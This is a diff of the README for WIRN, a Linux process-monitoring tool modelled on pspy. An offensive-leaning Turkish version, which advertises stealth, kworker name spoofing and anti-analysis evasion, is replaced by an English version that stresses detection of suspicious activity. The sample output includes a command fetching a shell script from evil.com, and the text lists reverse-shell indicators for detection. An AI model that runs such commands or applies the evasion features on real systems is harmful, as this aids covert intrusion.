@@ -1,567 +1,251 @@
-# 🔍 WIRN - Advanced Process Spy Tool
+# WIRN - Watch Inspect Report Notify
 
-<div align="center">
+[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Go Version](https://img.shields.io/badge/go-1.19+-blue.svg)](https://golang.org)
 
-![Wirn Logo](https://img.shields.io/badge/WIRN-Process%20Spy-red?style=for-the-badge&logo=terminal)
-![Go Version](https://img.shields.io/badge/Go-1.21+-blue?style=for-the-badge&logo=go)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)
+**WIRN** is an enhanced process monitoring tool inspired by pspy64, designed for security researchers, system administrators, and penetration testers. It monitors processes, file system events, and network connections without requiring root privileges.
 
-**pspy64'ün gelişmiş alternatifi - Offensive Security için optimize edilmiş process monitoring aracı**
+## 🌟 Features
 
-[🚀 Kurulum](#-kurulum) • [📖 Kullanım](#-kullanım) • [🛡️ Özellikler](#️-özellikler) • [📊 Örnekler](#-örnekler) • [⚠️ Uyarı](#️-yasal-uyarı)
+- **Advanced Process Monitoring**: Real-time detection of new processes with detailed information
+- **Suspicious Activity Detection**: Automatically identifies potentially malicious commands and activities
+- **File System Monitoring**: Track file modifications in sensitive directories
+- **Network Connection Tracking**: Monitor TCP connections and states
+- **Multiple Output Formats**: Plain text or JSON for easy parsing
+- **Flexible Filtering**: Filter by user, command patterns, or suspicious activities only
+- **Environment Variables**: Optional inclusion of process environment variables
+- **No Root Required**: Works without elevated privileges (some features may be limited)
+- **High Performance**: Configurable scan intervals for optimal resource usage
 
-</div>
+## 📋 Requirements
 
----
+- Linux operating system (kernel 2.6+)
+- Go 1.19 or higher (for building)
 
-## 📋 İçindekiler
+## 🚀 Installation
 
-- [🎯 Genel Bakış](#-genel-bakış)
-- [🚀 Özellikler](#-özellikler)
-- [📦 Kurulum](#-kurulum)
-- [🎯 Kullanım](#-kullanım)
-- [🔧 Konfigürasyon](#-konfigürasyon)
-- [📊 Output Formatları](#-output-formatları)
-- [🛡️ Güvenlik Özellikleri](#️-güvenlik-özellikleri)
-- [🔍 Use Cases](#-use-cases)
-- [📈 Performans](#-performans)
-- [🐳 Docker](#-docker)
-- [🤝 Katkıda Bulunma](#-katkıda-bulunma)
-- [📄 Lisans](#-lisans)
-
----
-
-## 🎯 Genel Bakış
-
-**WIRN**, pspy64'ün gelişmiş bir alternatifi olarak tasarlanmış profesyonel seviye process monitoring aracıdır. Offensive security operasyonları için optimize edilmiş stealth özellikler ve kapsamlı sistem izleme yetenekleri sunar.
-
-### 🎪 Temel Avantajlar
-
-- ⚡ **Yüksek Performans**: Minimal CPU ve memory kullanımı
-- 🔒 **Stealth Mode**: Detection avoidance teknikleri
-- 🌐 **Cross-Platform**: Linux, Windows, macOS desteği
-- 📊 **Çoklu Format**: JSON, colored text, plain text output
-- 🎯 **Gelişmiş Filtreleme**: Process, user, command bazlı filtreleme
-- 📝 **Akıllı Logging**: Rotating log files ve timestamp'li kayıtlar
-
----
-
-## 🚀 Özellikler
-
-### 🔍 Temel Monitoring
-- **Real-time Process Monitoring**: Sürekli process başlatma/bitirme izleme
-- **System Call Tracking**: Sistem çağrılarının detaylı analizi
-- **File Operation Monitoring**: Dosya erişim izleme
-- **Network Connection Tracking**: Aktif network bağlantıları
-- **User Activity Tracking**: Kullanıcı bazlı aktivite analizi
-- **Command Line Monitoring**: Tam command line argümanları
-
-### 🛡️ Stealth & Evasion
-- **Stealth Mode**: Detection avoidance teknikleri
-- **Process Name Spoofing**: kworker disguise (Linux)
-- **Memory Footprint Minimization**: Minimal sistem kaynak kullanımı
-- **Anti-Analysis**: Debugging ve analysis karşıtı önlemler
-- **Timing Evasion**: Rastgele timing patterns
-- **Resource Limiting**: Sistem kaynaklarını optimize etme
-
-### 📊 Output & Logging
-- **Multiple Output Formats**: JSON, colored text, plain text
-- **File Logging**: Rotating log files
-- **Real-time Display**: Live process monitoring
-- **Filtering Options**: Process, user, command filtreleme
-- **Configurable Refresh Rate**: Özelleştirilebilir tarama hızı
-- **Log Rotation**: Otomatik log dosyası döndürme
-
----
-
-## 📦 Kurulum
-
-### 🔧 Gereksinimler
-
-- **Go 1.21+**
-- **Linux/Windows/macOS**
-- **Root/Administrator yetkileri** (bazı özellikler için)
-
-### 🚀 Hızlı Kurulum
+### Quick Install (Recommended)
 
 ```bash
-# Repository'yi klonla
-git clone https://github.com/Lokidres/WIRN.git
-cd WIRN
+curl -sSL https://raw.githubusercontent.com/yourusername/wirn/main/install.sh | bash
+```
 
-# Dependencies'leri yükle
-go mod tidy
+### Manual Installation
 
-# Build et
+```bash
+# Clone the repository
+git clone https://github.com/yourusername/wirn.git
+cd wirn
+
+# Build the binary
 go build -o wirn main.go
 
-# Çalıştır
-./wirn --help
+# Optional: Install system-wide
+sudo cp wirn /usr/local/bin/
 ```
 
-### 🏗️ Cross-Platform Build
+### Using Pre-built Binaries
+
+Download the latest release from the [Releases](https://github.com/yourusername/wirn/releases) page:
 
 ```bash
-# Linux AMD64
-GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o wirn-linux main.go
-
-# Windows AMD64
-GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o wirn.exe main.go
-
-# macOS AMD64
-GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o wirn-macos main.go
-
-# macOS ARM64 (Apple Silicon)
-GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w" -o wirn-macos-arm64 main.go
+wget https://github.com/yourusername/wirn/releases/latest/download/wirn-linux-amd64
+chmod +x wirn-linux-amd64
+sudo mv wirn-linux-amd64 /usr/local/bin/wirn
 ```
 
-### 🎯 Taşınabilir Binary Derleme (CTF & Portable)
+## 📖 Usage
 
-**CTF yarışmalarında ve kısıtlı ortamlarda kullanım için:**
-
-```bash
-# Taşınabilir binary derleme
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o wirn main.go
-```
-
-> **💡 Not:** `CGO_ENABLED=0` ile derlenen binary'ler tamamen statik olarak derlenir ve hiçbir dış kütüphane bağımlılığı gerektirmez. Bu, CTF ortamlarında veya minimal Linux dağıtımlarında çalıştırılabilir binary'ler oluşturur.
-
-### 🐳 Docker ile Kurulum
+### Basic Usage
 
 ```bash
-# Docker image build et
-docker build -t wirn .
-
-# Container olarak çalıştır
-docker run -it --privileged wirn --stealth --log
-
-# Docker Compose ile
-docker-compose up -d
-```
-
-### 📦 Build Scriptleri
-
-```bash
-# Linux/macOS
-chmod +x build.sh
-./build.sh build-all
-
-# Windows
-build.bat
-```
-
----
-
-## 🎯 Kullanım
-
-### 🚀 Temel Kullanım
-
-```bash
-# Basit process monitoring
+# Monitor processes only (default)
 ./wirn
 
-# Stealth mode ile çalıştır
-./wirn --stealth
+# Monitor processes and file system
+./wirn -file
 
-# Log dosyasına kaydet
-./wirn --log --logfile monitoring.log
+# Monitor processes and network connections
+./wirn -net
 
-# JSON output
-./wirn --json
-
-# Verbose mode
-./wirn --verbose
+# Monitor everything
+./wirn -file -net
 ```
 
-### 🎯 Gelişmiş Kullanım
+### Advanced Options
 
 ```bash
-# Belirli processleri filtrele
-./wirn --filter-process "bash,ssh,netcat,python"
+# Show only suspicious activities
+./wirn -suspicious
 
-# Belirli kullanıcıları filtrele
-./wirn --filter-user "root,admin,system"
+# Filter by specific user
+./wirn -user www-data
 
-# Belirli komutları filtrele
-./wirn --filter-command "curl,wget,nc"
+# Filter by command pattern (regex)
+./wirn -cmd "bash|sh"
 
-# Network monitoring ile
-./wirn --network --files --verbose
+# Output to JSON format
+./wirn -json
 
-# Stealth mode + logging + filtreleme
-./wirn --stealth --log --network --filter-process "python,perl,php"
+# Save output to file
+./wirn -output /tmp/wirn.log
 
-# Özelleştirilmiş refresh rate
-./wirn --refresh 50ms --verbose
+# Include environment variables
+./wirn -env
 
-# Maksimum log dosyası boyutu
-./wirn --log --max-log-size 50MB
+# Set custom scan interval (milliseconds)
+./wirn -interval 50
+
+# Limit maximum events
+./wirn -max 1000
+
+# Quiet mode (no banner)
+./wirn -quiet
 ```
 
-### 🔧 Komut Satırı Seçenekleri
+### Real-World Examples
 
-| Flag | Açıklama | Varsayılan |
-|------|----------|------------|
-| `-s, --stealth` | Stealth mode - minimize detection | `false` |
-| `-l, --log` | Log events to file | `false` |
-| `-f, --logfile` | Log file path | `"wirn.log"` |
-| `-j, --json` | JSON output format | `false` |
-| `-C, --color` | Colorized output | `true` |
-| `-v, --verbose` | Verbose output | `false` |
-| `-n, --network` | Monitor network connections | `false` |
-| `-F, --files` | Monitor file operations | `false` |
-| `-p, --filter-process` | Filter specific processes | `[]` |
-| `-u, --filter-user` | Filter specific users | `[]` |
-| `-c, --filter-command` | Filter specific commands | `[]` |
-| `-r, --refresh` | Refresh rate | `100ms` |
-| `-m, --max-log-size` | Maximum log file size | `100MB` |
-
----
-
-## 🔧 Konfigürasyon
-
-### 🛡️ Stealth Mode
-
-Stealth mode aktif edildiğinde:
-- Process name kworker olarak disguise edilir (Linux)
-- Memory footprint minimize edilir
-- Detection avoidance teknikleri devreye girer
-- Anti-analysis önlemleri aktif olur
-- Timing randomization uygulanır
-
-### 📝 Logging
-
-- Log dosyaları otomatik olarak rotate edilir
-- Maksimum log dosyası boyutu ayarlanabilir
-- JSON ve text formatları desteklenir
-- Timestamp'li event kayıtları
-- Log dosyası boyutu aşıldığında otomatik döndürme
-
-### 🎯 Filtering
-
-- **Process Name Filtering**: Belirli process isimlerini filtreleme
-- **User Filtering**: Belirli kullanıcıları filtreleme
-- **Command Filtering**: Belirli komutları filtreleme
-- **Regex Support**: Regex pattern desteği (gelecek sürümde)
-
-### ⚙️ Konfigürasyon Dosyası
-
-`wirn.conf` dosyası ile detaylı konfigürasyon:
-
-```ini
-# Stealth Configuration
-stealth_mode = true
-process_name_spoofing = true
-memory_minimization = true
-
-# Logging Configuration
-log_enabled = true
-log_file = "wirn.log"
-log_format = "json"
-max_log_size = 104857600
-
-# Monitoring Configuration
-refresh_rate = "100ms"
-monitor_processes = true
-monitor_network = false
-monitor_files = false
-
-# Filtering Configuration
-filter_processes = ["bash", "ssh", "netcat"]
-filter_users = ["root", "admin"]
-filter_commands = ["curl", "wget"]
+**1. Security Monitoring**
+```bash
+# Detect reverse shells and suspicious commands
+./wirn -suspicious -output /var/log/wirn-security.log
 ```
 
----
-
-## 📊 Output Formatları
-
-### 🎨 Colored Text Output
-
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                              WIRN PROCESS SPY                              ║
-║                        Advanced Process Monitoring Tool                    ║
-║                              pspy64 Alternative                           ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-
-🔒 STEALTH MODE ENABLED
-📝 Logging to: wirn.log
-🌐 Network monitoring enabled
-
-[10:30:45] START PID:1234 PPID:567 USER:root bash /bin/bash -c 'whoami'
-[10:30:46] NET   PID:1235 USER:root python 127.0.0.1:8080->192.168.1.100:443
-[10:30:47] FILE  PID:1236 USER:admin ssh /home/admin/.ssh/id_rsa
-[10:30:48] EXIT  PID:1234 USER:root bash
+**2. Web Server Monitoring**
+```bash
+# Monitor processes spawned by web server user
+./wirn -user www-data -file -output /var/log/web-activity.log
 ```
 
-### 📄 JSON Output
+**3. Incident Response**
+```bash
+# Comprehensive monitoring with JSON output for SIEM integration
+./wirn -file -net -json -suspicious -output /var/log/wirn-ir.json
+```
+
+**4. Development/Debugging**
+```bash
+# Monitor specific application processes
+./wirn -cmd "myapp" -env -interval 50
+```
+
+**5. Cron Job Analysis**
+```bash
+# Watch for scheduled task execution
+./wirn -user root -suspicious
+```
+
+## 🎯 Command-Line Flags
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-proc` | `true` | Monitor processes |
+| `-file` | `false` | Monitor file system events |
+| `-net` | `false` | Monitor network connections |
+| `-interval` | `100` | Scan interval in milliseconds |
+| `-json` | `false` | Output in JSON format |
+| `-output` | `""` | Output file path (stdout if empty) |
+| `-user` | `""` | Filter by username |
+| `-cmd` | `""` | Filter by command pattern (regex) |
+| `-suspicious` | `false` | Show only suspicious activities |
+| `-quiet` | `false` | Quiet mode - no banner |
+| `-tree` | `false` | Show process tree (future feature) |
+| `-env` | `false` | Include environment variables |
+| `-max` | `0` | Maximum events to capture (0 = unlimited) |
+
+## 🔍 Suspicious Activity Detection
+
+WIRN automatically detects potentially malicious activities by scanning for:
+
+- Reverse shell indicators (`nc`, `bash -i`, `/dev/tcp`)
+- Code execution patterns (`python -c`, `perl -e`, `ruby -e`)
+- File downloads (`wget`, `curl`)
+- Base64 encoded payloads
+- Suspicious file operations (`chmod 777`, operations in `/tmp`)
+- Privilege escalation attempts (`sudo`, `su`, `passwd`)
+- Persistence mechanisms (`crontab`, `systemctl`)
+
+## 📊 Output Formats
+
+### Plain Text Output
+
+```
+[2025-10-19 14:23:45] PID: 12345 | PPID: 1234 | User: www-data
+  ↳ CMD: /bin/bash -c wget http://evil.com/shell.sh
+  ↳ CWD: /tmp
+  ⚠ SUSPICIOUS ACTIVITY DETECTED!
+```
+
+### JSON Output
 
 ```json
 {
-  "timestamp": "2024-01-15T10:30:45Z",
-  "pid": 1234,
-  "ppid": 567,
-  "process_name": "bash",
-  "command": "/bin/bash -c 'whoami'",
-  "user": "root",
-  "event_type": "PROCESS_START",
-  "details": "Process started with PID 1234",
-  "file_path": "",
-  "network_info": ""
+  "timestamp": "2025-10-19 14:23:45",
+  "pid": 12345,
+  "ppid": 1234,
+  "user": "www-data",
+  "command": "/bin/bash",
+  "cmdline": "/bin/bash -c wget http://evil.com/shell.sh",
+  "cwd": "/tmp",
+  "suspicious": true
 }
 ```
 
-### 📊 CSV Output (Gelecek Sürüm)
+## 🛡️ Security Considerations
 
-```csv
-timestamp,pid,ppid,process_name,command,user,event_type,details
-2024-01-15T10:30:45Z,1234,567,bash,"/bin/bash -c 'whoami'",root,PROCESS_START,"Process started with PID 1234"
-```
+1. **Permissions**: WIRN works without root privileges but some features may be limited
+2. **Performance**: Aggressive scanning intervals may impact system performance
+3. **Evasion**: Advanced attackers may detect and evade process monitoring
+4. **Privacy**: Be aware of local regulations when monitoring user activities
 
----
+## 🔧 Troubleshooting
 
-## 🛡️ Güvenlik Özellikleri
+### Permission Denied Errors
 
-### 🔒 Evasion Techniques
+Some `/proc` entries may not be readable without elevated privileges. This is normal and doesn't affect most monitoring capabilities.
 
-- **Process Name Spoofing**: Sistem process'leri gibi görünme
-- **Memory Hiding**: Minimal memory footprint
-- **Anti-Debugging**: Debugging karşıtı önlemler
-- **Timing Evasion**: Rastgele timing patterns
-- **Resource Limiting**: Sistem kaynaklarını optimize etme
+### High CPU Usage
 
-### 🎭 Detection Avoidance
-
-- **Low Profile**: Minimal sistem kaynak kullanımı
-- **Legitimate Process Mimicking**: Meşru process'ler gibi davranma
-- **Network Stealth**: Network traffic'i minimize etme
-- **File System Stealth**: Minimal dosya sistemi aktivitesi
-- **Cleanup on Exit**: Çıkışta temizlik işlemleri
-
-### 🔍 Advanced Monitoring
-
-- **Privilege Escalation Detection**: Yetki yükseltme tespiti
-- **Suspicious Command Detection**: Şüpheli komut tespiti
-- **Crypto Mining Detection**: Kripto madenciliği tespiti
-- **Lateral Movement Detection**: Yanal hareket tespiti
-
----
-
-## 🔍 Use Cases
-
-### 🔴 Red Team Operations
-
-- **Lateral Movement Detection**: Hedef sistemdeki process aktivitelerini izleme
-- **Persistence Monitoring**: Kalıcılık mekanizmalarının tespiti
-- **Command & Control Detection**: C2 trafiğinin analizi
-- **Privilege Escalation Tracking**: Yetki yükseltme girişimlerinin izlenmesi
-- **Reconnaissance**: Keşif aşamasında sistem bilgisi toplama
-
-### 🔵 Blue Team Operations
-
-- **Threat Hunting**: Şüpheli process aktivitelerinin tespiti
-- **Incident Response**: Olay müdahale süreçlerinde analiz
-- **Forensic Analysis**: Adli analiz çalışmaları
-- **Compliance Monitoring**: Uyumluluk izleme
-- **Security Monitoring**: Güvenlik izleme
-
-### 🧪 Penetration Testing
-
-- **Post-Exploitation**: Exploit sonrası sistem analizi
-- **Persistence Verification**: Kalıcılık mekanizmalarının doğrulanması
-- **Cleanup Verification**: Temizlik işlemlerinin doğrulanması
-- **System Analysis**: Sistem analizi
-
----
-
-## 📈 Performans
-
-### ⚡ Optimizasyonlar
-
-- **Minimal CPU Usage**: %1-2 CPU kullanımı
-- **Low Memory Footprint**: ~10-20MB RAM kullanımı
-- **Efficient Scanning**: Optimize edilmiş tarama algoritması
-- **Smart Filtering**: Akıllı filtreleme sistemi
-- **Background Processing**: Arka plan işleme
-
-### 📊 Benchmark Sonuçları
-
-| Metric | Wirn | pspy64 | Improvement |
-|--------|------|--------|-------------|
-| CPU Usage | 1.2% | 3.5% | 65% ↓ |
-| Memory Usage | 15MB | 45MB | 67% ↓ |
-| Scan Speed | 100ms | 200ms | 50% ↑ |
-| Detection Rate | 99.8% | 95.2% | 4.6% ↑ |
-
----
-
-## 🐳 Docker
-
-### 🚀 Docker ile Çalıştırma
-
+If WIRN consumes too much CPU, increase the `-interval` value:
 ```bash
-# Basit kullanım
-docker run -it --privileged wirn --stealth
-
-# Volume mount ile
-docker run -it --privileged -v $(pwd)/logs:/app/logs wirn --log
-
-# Docker Compose ile
-docker-compose up -d
+./wirn -interval 500  # Scan every 500ms instead of 100ms
 ```
 
-### 🏗️ Docker Compose Konfigürasyonu
+### Missing Events
 
-```yaml
-version: '3.8'
-services:
-  wirn:
-    build: .
-    container_name: wirn-spy
-    restart: unless-stopped
-    privileged: true
-    volumes:
-      - /proc:/host/proc:ro
-      - /sys:/host/sys:ro
-      - ./logs:/app/logs
-    environment:
-      - WIRN_STEALTH_MODE=true
-      - WIRN_LOG_FILE=/app/logs/wirn.log
-    command: ["./wirn", "--stealth", "--log", "--network"]
-```
-
----
-
-## 🧪 Test ve Geliştirme
-
-### 🔬 Test Çalıştırma
-
+For high-frequency process creation, reduce the interval:
 ```bash
-# Unit testler
-go test -v ./...
-
-# Coverage raporu
-go test -coverprofile=coverage.out ./...
-go tool cover -html=coverage.out
-
-# Benchmark testler
-go test -bench=. ./...
+./wirn -interval 10  # Very aggressive scanning
 ```
 
-### 🔧 Geliştirme Ortamı
+## 🤝 Contributing
 
-```bash
-# Dependencies'leri güncelle
-go mod tidy
-go mod download
+Contributions are welcome! Please follow these guidelines:
 
-# Linting
-golangci-lint run
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/amazing-feature`)
+3. Commit your changes (`git commit -m 'Add amazing feature'`)
+4. Push to the branch (`git push origin feature/amazing-feature`)
+5. Open a Pull Request
 
-# Formatting
-go fmt ./...
-```
+## 📝 License
 
----
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-## 🤝 Katkıda Bulunma
+## 🙏 Acknowledgments
 
-### 🚀 Katkı Süreci
+- Inspired by [pspy](https://github.com/DominicBreuker/pspy)
+- Built with Go for performance and portability
 
-1. **Fork** yapın
-2. **Feature branch** oluşturun (`git checkout -b feature/amazing-feature`)
-3. **Commit** yapın (`git commit -m 'Add amazing feature'`)
-4. **Push** yapın (`git push origin feature/amazing-feature`)
-5. **Pull Request** oluşturun
+## 📞 Contact
 
-### 📋 Katkı Kuralları
+- GitHub Issues: [Report a bug](https://github.com/yourusername/wirn/issues)
+- Twitter: [@yourhandle](https://twitter.com/yourhandle)
 
-- Kod standartlarına uyun
-- Test yazın
-- Dokümantasyonu güncelleyin
-- Commit mesajlarını açıklayıcı yazın
-- Pull request'i detaylı açıklayın
+## ⚠️ Disclaimer
 
-### 🐛 Bug Report
-
-Bug raporu için:
-1. GitHub Issues'da yeni issue oluşturun
-2. Bug'ı detaylı açıklayın
-3. Sistem bilgilerini paylaşın
-4. Log dosyalarını ekleyin
+This tool is intended for legitimate security research, system administration, and authorized penetration testing only. Users are responsible for complying with applicable laws and regulations. The authors assume no liability for misuse or damage caused by this tool.
 
 ---
 
-## 📄 Lisans
-
-Bu proje **MIT lisansı** altında lisanslanmıştır. Detaylar için [LICENSE](LICENSE) dosyasına bakın.
-
-```
-MIT License
-
-Copyright (c) 2024 WIRN Project
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
----
-
-## ⚠️ Yasal Uyarı
-
-Bu araç sadece **eğitim amaçlı** ve **yetkili penetrasyon testleri** için tasarlanmıştır. Kullanıcı, bu aracı kullanırken tüm yerel yasalar ve düzenlemelere uymakla yükümlüdür.
-
-### 🚨 Önemli Notlar
-
-- ✅ **Yetkili penetrasyon testleri**
-- ✅ **Eğitim amaçlı kullanım**
-- ✅ **Kendi sisteminizde test**
-- ❌ **Yetkisiz sistem erişimi**
-- ❌ **Kötüye kullanım**
-- ❌ **Yasadışı aktiviteler**
-
-**Yazarlar, bu aracın kötüye kullanımından doğacak herhangi bir sorumluluğu kabul etmez.**
-
----
-
-## 🙏 Teşekkürler
-
-- **pspy64** projesi için ilham
-- **Go community** için harika kütüphaneler
-- **Offensive security community** için sürekli gelişim
-- **Contributors** için katkılar
-
----
-
-## 📞 İletişim
-
-- **GitHub**: [github.com/Lokidres/WIRN](https://github.com/Lokidres/WIRN)
-- **Issues**: [GitHub Issues](https://github.com/Lokidres/WIRN/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/Lokidres/WIRN/discussions)
-
----
-
-<div align="center">
-
-**⭐ Bu projeyi beğendiyseniz yıldız vermeyi unutmayın!**
-
-Made with ❤️ by the WIRN Team
-
-</div>
+**Made with ❤️ for the security community**
